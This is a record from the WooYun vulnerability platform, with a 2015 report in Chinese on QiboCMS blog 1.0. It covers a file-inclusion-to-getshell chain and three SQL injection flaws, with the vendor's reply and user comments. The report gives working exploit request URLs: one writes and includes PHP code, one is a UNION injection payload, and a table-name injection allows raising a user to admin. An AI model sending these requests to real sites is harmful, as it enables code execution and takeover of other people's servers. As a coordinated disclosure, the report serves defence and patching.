{"id": 37940, "wybug_id": "wooyun-2015-098582", "wybug_title": "齐博cms博客系统 前台 GETSHELL一处 &amp; 三处注入。", "wybug_corp": "齐博CMS", "wybug_author": "′雨。", "wybug_date": "2015-03-02 17:10", "wybug_open_date": "2015-06-02 09:24", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-02：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-04：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-03-07：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-04-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-08：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-05-18：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-02：\t细节向公众公开  简要描述： 测试版本 http://down.qibosoft.com/down.php?v=blog1.0前台 可GETSHELL 可注入 无视GPC全部放在一起来。 详细说明：  http://down.qibosoft.com/down.php?v=blog1.0 下载地址。1:GETSHELL需要注册一个会员在blog/require/ajax/ol_module.php 中\n//显示模块if($step==2){\t$uid=$lfjuid;\t@include(\"template/space/module/$moduleid.php\");\n看到这段代码 $moduleid 因为伪全局是可以控制的 且没过滤。但是因为qibo全局有转义 所以肯定是截断不了的。 但是因为qibo的特殊性 在qibo的后台文件当中 function_exists('html') OR exit('ERR');所以直接访问是不行的。是这样判断的 所以我们就算不能截断 我们可以直接把后台的文件包含进来 然后进而操作后台。所以qibo在操作包含的文件中都用正则来过滤了, 却遗漏了这里。所以我们直接在后台找一个能GETSHELL的文件 然后包含进来 我们就可以直接操作后台了。再来找能在后台GETSHELL的点在后台中看到模版  hack/template/admin.php中\nelseif($action==\"maketpl\"&&$Apower[template_list]){\t$path=dirname($postdb[filepath]);\tif(!is_dir(ROOT_PATH.$path)){\t\tmakepath(ROOT_PATH.$path);\t}\tif(is_file(ROOT_PATH.$postdb[filepath])){\t\tshowmsg(\"此模板已存在了\");\t}\telseif(!eregi(\"(\\.htm|\\.html)$\",$postdb[filepath])){\t\tshowmsg('模板只能是.htm .html文件!');\t}\tif($ifupfile)\t{\t\t$array[name]=is_array($postfile)?$_FILES[postfile][name]:$postfile_name;\t\t$filetype=strtolower(strrchr($array[name],\".\"));\t\tif($filetype!='.zip')\t\t{\t\t\tshowerr(\"只能上传ZIP格式的压缩包\",1);\t\t}\t\twrite_file(ROOT_PATH.$postdb[filepath],' ');\t\tif(!is_writable(ROOT_PATH.$postdb[filepath])){\t\t\techo \"文件写入失败,请确认目录可写:\".ROOT_PATH.$postdb[filepath];\t\t\tdie();\t\t}\t\t\t\t$array[path]=$webdb[updir].\"/\";\t\t$array[size]=is_array($postfile)?$_FILES[postfile][size]:$postfile_size;\n限制了只能为.htm  和 .html结尾的。 然后就直接把文件写了出来。不怕不怕。再看到blog\\require\\ajax\\edit_sort.php\nelse{\t$query=$db->query(\"SELECT * FROM {$pre}$table_album WHERE uid='$lfjuid' ORDER BY list DESC\");\twhile( $rs=$db->fetch_array($query) ){\t\t$listdb[]=$rs;\t\t}\trequire tpl_e($job); //job可控  }\n\nfunction tpl_e($html){\treturn \"template/space/edit/$html.htm\";}\n这里我们直接把我们写的htm 返回回来 然后直接包含 又执行了代码在登录会员的情况下1: /blog/ajax.php?inc=ol_module&step=2&step=2&moduleid=../../../../hack/template/admin&action=maketpl&Apower[template_list]=1&postdb[filepath]=template/yu.htm&postdb[code]=<?php phpinfo();?>\n\n2:blog/ajax.php?inc=edit_sort&job=../../../../template/yu  \n\n0x02 注入do/jf.php\nerror_reporting(0);extract($_GET);require_once(dirname(__FILE__).\"/../data/config.php\");if(!eregi(\"^([0-9]+)$\",$id)){\tdie(\"document.write('ID不存在');\");}$_GET['FileName']=$_POST['FileName']=$_COOKIE['FileName']=$FileName='';$FileName=dirname(__FILE__).\"/../cache/js/\";$FileName.=\"{$id}.php\";//默认缓存3分钟.if(!$webdb[\"cache_time_js\"]){\t$webdb[\"cache_time_js\"]=3;}if( (time()-filemtime($FileName))<($webdb[\"cache_time_js\"]*60) ){\t@include($FileName);\t$show=str_replace(array(\"\\n\",\"\\r\",\"'\"),array(\"\",\"\",\"\\'\"),stripslashes($show));\tif($iframeID){\t//框架方式不会拖慢主页面打开速度,推荐\t\t//处理跨域问题\t\tif($webdb[cookieDomain]){\t\t\techo \"<SCRIPT LANGUAGE=\\\"JavaScript\\\">document.domain = \\\"$webdb[cookieDomain]\\\";</SCRIPT>\";\t\t}\t\techo \"<SCRIPT LANGUAGE=\\\"JavaScript\\\">\t\tparent.document.getElementById('$iframeID').innerHTML='$show';\t\t</SCRIPT>\";\t}else{\t\t\t//JS式会拖慢主页面打开速度,不推荐\t\techo \"document.write('$show');\";\t}\texit;}require(dirname(__FILE__).\"/\".\"global.php\");require_once(ROOT_PATH.\"inc/label_funcation.php\");\t$query=$db->query(\" SELECT * FROM {$pre}label WHERE lid='$id' \");\n WooYun: 齐博地方门户鸡肋文件包含造成的高危SQL注入 这个参考师傅大屌的 就行了 就不多说啦。blog/ajax.php?inc=ol_module&step=2&moduleid=../../../../do/js&&id=514125&webdb[web_open]=1&webdb[cache_time_js]=-1&pre=qb_label%20where%20lid=-1%20UNION%20SELECT%201,2,3,4,5,6,0,user%28%29,9,10,11,12,13,14,15,16,17,18,19%23\n\n0x03 在blog/require/ajax/edit_sort.php中 \nswitch($job){\tcase \"video_sort\":\t\t$table_album=\"blog_mv_album\";\tbreak;\tcase \"photo_sort\":\t\t$table_album=\"blog_photo_album\";\tbreak;\tcase \"log_sort\":\t\t$table_album=\"blog_log_album\";\tbreak;\tcase \"shop_sort\":\t\t$table_album=\"blog_shop_album\";\tbreak;\tcase \"down_sort\":\t\t$table_album=\"blog_down_album\";\tbreak;\tcase \"music_sort\":\t\t$table_album=\"blog_music_album\";\tbreak;\tcase \"flash_sort\":\t\t$table_album=\"blog_flash_album\";\tbreak;}//首先这个table_album switch中 他没有设置defalut的表名 导致了我们如果设置的不是这些case 就相当于这个变量没有初始化了 再结合qibo的伪全局 就可以控制这个变量了。if($act=='modify'){\tforeach($name AS $key=>$value){\t\tif($value!=$specialname[$key]){\t\t\t$name = filtrate($name);\t\t\t$db->query(\"UPDATE `{$pre}$table_album` SET name='$value' WHERE uid='$lfjuid' AND id='$key'\");\");//直接带入查询 且是update表名可控 导致了我们可以直接update我们的判断是不是管理的表 直接提升自己为管理\t\t}\t}\tjob_end($job);\t\t}\n\n\n\n\n0x04 blog\\member\\update_sort.php \nif($action == \"add\"){\t$rs=$db->get_one(\"SELECT COUNT(*) AS NUM FROM `{$pre}blog_{$type}_album` WHERE uid='$lfjuid'\");\tif($rs[NUM]>50){\t\tdie(\"你不能创建大于50个分类\");\t}\t$db->query(\"INSERT INTO `{$pre}blog_{$type}_album` SET name='$name',uid='$lfjuid',list='$timestamp'\");\techo \"<META HTTP-EQUIV=REFRESH CONTENT='0;URL=?step=1&type=$type'>\";\texit;}if($action == \"update\"){\tforeach($name AS $key=>$value){\t\t$db->query(\"UPDATE `{$pre}blog_{$type}_album` SET name='$value' WHERE uid='$lfjuid' AND id='$key'\");\t}\techo \"<META HTTP-EQUIV=REFRESH CONTENT='0;URL=?step=1&type=$type'>\";\texit;}\ntype未初始化 可控 导致了注入。 \n\n   漏洞证明：  \n\n   修复方案：  由鸡肋的文件包含引起的 用你们惯用的正则把那里过滤下就好。该初始化的就初始化。   版权声明：转载请注明来源 ′雨。@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：17  确认时间：2015-03-04 09:23 厂商回复： 感谢提出来 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-03-02 17:12 |    \t\t浅蓝 \t\t\t( 普通白帽子  |\t\t\t        Rank:274 漏洞数:103        | 爱安全:www.ixsec.orgXsec社区:zone.ixse...)\t\t \n  膜拜雨牛    \n     2015-03-02 17:18 |    \t\troker \t\t\t( 普通白帽子  |\t\t\t        Rank:357 漏洞数:102        )\t\t \n  为什么要这样    \n     2015-03-02 17:33 |    \t\t′雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:188        | Only Code Never Lie To Me.)\t\t \n  @roker we could have had it at all:-(    \n     2015-03-06 21:10 |    \t\t银冥币 \t\t\t( 实习白帽子  |\t\t\t        Rank:35 漏洞数:19        | \"/upload/avatar/avatar_251_b.jpg\" />)\t\t \n  @′雨。 雨牛_(:3」∠)_    \n     2015-03-11 16:13 |    \t\tSkull \t\t\t( 实习白帽子  |\t\t\t        Rank:95 漏洞数:29        | 菜鸟一枚。)\t\t \n  膜拜雨牛    \n     2015-05-02 16:38 |    \t\tMr.R \t\t\t( 实习白帽子  |\t\t\t        Rank:52 漏洞数:13        | 求大神带我飞 qq2584110147)\t\t \n  膜拜雨牛，雨牛你搞了多少money了    \n     2015-05-14 15:19 |    \t\tprolog \t\t\t( 普通白帽子  |\t\t\t        Rank:544 漏洞数:103        | 低调求发展)\t\t \n  @′雨。  三个符号多少钱    \n     2015-06-06 23:42 |    \t\txq17 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:3        | xq17小菜鸟来向大神学习了)\t\t \n  Apower[template_list]=1  为什么要等于一  小菜一枚求指教    \n     2015-06-09 19:50 |    \t\t冰麒麟 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        | 就算是男孩子,只要可爱就没问题了.)\t\t \n  膜拜    \n     2015-07-04 21:40 |    \t\t爱神 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:1        | Qq190290957)\t\t \n  膜拜雨牛    \n     2015-07-20 13:29 |    \t\tBeenQuiver \t\t\t( 普通白帽子  |\t\t\t        Rank:101 漏洞数:26        | 专注而高效，坚持好的习惯千万不要放弃)\t\t \n  吊哦哦    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 17, "Ranks": null}